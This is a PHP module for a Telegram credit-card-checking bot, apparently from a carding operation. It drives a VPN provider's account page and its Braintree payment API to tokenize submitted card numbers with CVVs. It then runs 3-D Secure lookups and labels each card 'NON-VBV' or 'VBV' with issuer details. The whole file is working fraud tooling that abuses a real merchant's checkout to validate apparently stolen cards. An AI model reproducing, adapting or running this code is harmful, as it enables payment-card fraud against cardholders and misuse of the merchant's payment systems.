<?php

#----------------------------------------------------------------------#
#   CODED BY: Avin-Knight                                              #
#   GATE: B3 3D LOOKUP (AMOUNT = $4)                                   #
#   SITE: https://www.ivpn.net/account/                                #
#   USER: FREE USERs                                                   # 
#----------------------------------------------------------------------#
$gate = "3D LookUp";


if ((strpos($message, "/3d") === 0) || (strpos($message, "!3d") === 0)){

  if (in_array($userId, $prv_users) === false){
    if (in_array($userId, $vip_users) === false){
      if (in_array($userId, $premium_users) === false){
        sendMessage($chatId,$prv_unauth_msg, $message_id);
    return; } } }
  
/*  
  if (in_array($userId, $vip_users) === false){
    if (in_array($userId, $premium_users) === false){
    sendMessage($chatId,$vip_unauth_msg, $message_id);
    exit(); }
  }
 
/*
  if (in_array($userId, $prv_users) === false){
    if (in_array($userId, $vip_users) === false){
      if (in_array($userId, $premium_users) === false){
      sendMessage($chatId,$prv_unauth_msg, $message_id);
      return; } } }
  */




error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//  include "./Tools/functions/usefun.php";
//  include "./Tools/functions/flagsgen.php";


//================= [ EXPLODE & LISTA ] ================//
$lista = substr($message, 3);  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
  
if (empty($lista) || (strlen($lista) < 24) ) {
  $respo = urlencode ("<b>Invalid or Empty Input </b>❌\n<b>Format:</b> <code>/vbv cc|m|y|cvv</code>");
  sendMessage($chatId, $respo , $message_id); 
  return;  }
  
//================ [ Anti-Spam ] ===============//
if (($userId == "1190070178") === false){
list($spam, $timeleft) = checkAntispam($userId, 20);
if ($spam) {
    $respo = urlencode ("<b>ANTI SPAM </b>❌\n<a>Try after $timeleft seconds</a>\n");
    sendMessage($chatId, $respo , $message_id);
    exit(); }
} 
  
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];

$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }

if (strlen($ano) == 2) $ano = "20$ano";
if (strlen($mes) == 1) $mes = "0$mes";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";
$sid = "".SID()."";




sendaction($chatId, "typing");
$text = urlencode ("<b>Checking.. ♻️ </b><b>
CC :</b>   <code>$lista </code>\n
Result:  <i><b>Please wait !!</b> ⏳</i>");
$msg_result = reply($chatId, $text , $message_id);
$msg_json = json_decode($msg_result, TRUE);
$msg_id = $msg_json['result']['message_id'];   

$ip = "Live! ✅";
//================= [ CURL REQUESTS ] =================//
  
#--------------------[1th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://www.ivpn.net/web/accounts/create');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.ivpn.net';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.ivpn.net';
$headers[] = 'referer: https://www.ivpn.net/pricing/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"product":"IVPN Pro"}');
$res1 = curl_exec($ch);
curl_close($ch);



#--------------------[2th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://www.ivpn.net/web/accounts/braintree/client-token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.ivpn.net';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://www.ivpn.net/account/add-funds/pro.1week/cc';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res2 = curl_exec($ch);
curl_close($ch);
$ctoken = trim(strip_tags(getStr($res2,'"token":"','"')));
$getbearer = base64_decode($ctoken);
$bearer = GetStr($getbearer,'"authorizationFingerprint":"','"');



#--------------------[3th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Authority: payments.braintree-api.com';
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"09c5fdcc-3771-470e-95ae-09d55c20daa3"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$res3 = curl_exec($ch);
curl_close($ch);
$token = trim(strip_tags(getStr($res3,'"token":"','"')));



#--------------------[4st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/fr8nng657hwwy3mn/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Authority: api.braintreegateway.com';
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://www.ivpn.net';
$headers[] = 'Referer: https://www.ivpn.net/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":4,"additionalInfo":{},"bin":"'.$first6.'","dfReferenceId":"0_16d52e96-cb11-406e-969a-de2d6c2dbd4c","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.92.1","cardinalDeviceDataCollectionTimeElapsed":21'.rand(11,99).',"issuerDeviceDataCollectionTimeElapsed":6'.rand(11,99).',"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$bearer.'","braintreeLibraryVersion":"braintree/web/3.92.1","_meta":{"merchantAppId":"www.ivpn.net","platform":"web","sdkVersion":"3.92.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"09c5fdcc-3771-470e-95ae-09d55c20daa3"}}');
$res4 = curl_exec($ch);

$enrolle = trim(strip_tags(getStr($res4,'"enrolled":"','"')));
$status = trim(strip_tags(getStr($res4,'"status":"','"')));
$msg = trim(strip_tags(getStr($res4,'"message":"','"')));

$ibank = ucwords(strtolower(trim(strip_tags(getStr($res4,'"issuingBank":"','"')))));
$icountry = trim(strip_tags(getStr($res4,'"countryOfIssuance":"','"'))); 
$idebit = trim(strip_tags(getStr($res4,'"debit":"','"'))); 
$iprepaid = trim(strip_tags(getStr($res4,'"prepaid":"','"')));
$icommer = trim(strip_tags(getStr($res4,'"commercial":"','"')));
$ipayroll = trim(strip_tags(getStr($res4,'"payroll":"','"')));
$flag = getFlags(''.$icountry.'');
//$bininfo1 = "$ibank - $icountry";


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);





  editMessage($chatId, $respo , $msg_id);
//=================== [ RESPONSES ] ===================//

if((strpos($res4, 'authenticate_successful')) || (strpos($res4, 'authenticate_attempt_successful')) || (strpos($res4, 'lookup_not_enrolled'))){
    editMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> NON-VBV CARD </b>✅%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}

elseif ((strpos($res4, 'lookup_enrolled')) || (strpos($res4, "challenge_required")) || (strpos($res4, "authenticate_frictionless_failed"))){
    editMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> VBV CARD - (3D)</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}

elseif ((strpos($res4, 'authentication_unavailable')) || (strpos($res4, "authenticate_frictionless_failnaed"))){
    editMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b> AUTH UNAVAILABLE </b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}

elseif(strpos($res4,  '"status":"unsupported_card"')) {
    editMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>UNSUPPORTED CARD</b>%0A✦ Response: <b><i>'.$status.' - ['.$enrolle.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}

elseif(strpos($res4,  'error')) {
    editMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}

else {
    editMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ Card: <code>'.$lista.'</code>%0A✦ Status: <b>ERROR ['.urlencode($res4).']</b>%0A✦ Response: <b><i>'.$status.' ['.$msg.']</i></b><a>%0A —————————————————%0A</a>✦ Bank: <b>'.$ibank.'</b>%0A✦ Country: <b>'.$icountry.' ('.$flag.')</b>%0A✦ Debit: <b>'.$idebit.'</b>%0A✦ Commercial: <b>'.$icommer.'</b>%0A✦ Prepaid: <b>'.$iprepaid.'</b>%0A✦ Payroll: <b>'.$ipayroll.'</b>%0A<a> —————————————————%0A</a>%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>「 raven_ccs 」</a>', $msg_id);
}




curl_close($ch);
unlink("cookie.txt");
}

//====================[ VBV 3D LOOKUP ]=====================//

?>